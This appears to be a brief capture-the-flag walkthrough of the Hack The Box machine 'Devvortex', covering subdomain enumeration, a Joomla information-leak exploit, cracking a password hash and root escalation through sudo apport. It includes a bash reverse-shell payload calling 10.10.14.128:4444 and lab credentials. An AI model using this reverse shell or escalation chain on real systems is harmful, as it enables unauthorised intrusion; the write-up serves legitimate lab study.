# devvortex-reference
How I pwned devvortex

found hidden dir: dev.devvortex.htb

enumeration using dirsearch and seclists wordlist subdomains-top1million-20000.txt

found an admin page at /administrator/

Searched metasploit nothing came up

But on googling found an exploit at:
https://github.com/adhikara13/CVE-2023-23752

Reveals username as lewis and password as P4ntherg0t1n5r3c0n##

shell payload
`exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.128/4444 0>&1'");`

After getting the reverse shell stabilize it
This will allow commands such as mysql to be run without hassle

In the users table, the password hash was acquired which was cracked using 

`john --format=bcrpyt <filename> --wordlist=/usr/share/wordlists/rockyou.txt`

ssh creds:
username: logan
password: tequieromucho

After this run `sudo -l` which shows you that the `/usr/bin/apport` can run with root.
So, run it with the -f command and view a report.
This opens with a vim like interface which runs shell commands as root.
Enjoy!

Moral of the story: After running `sudo -l`, explore whatever that you find there.
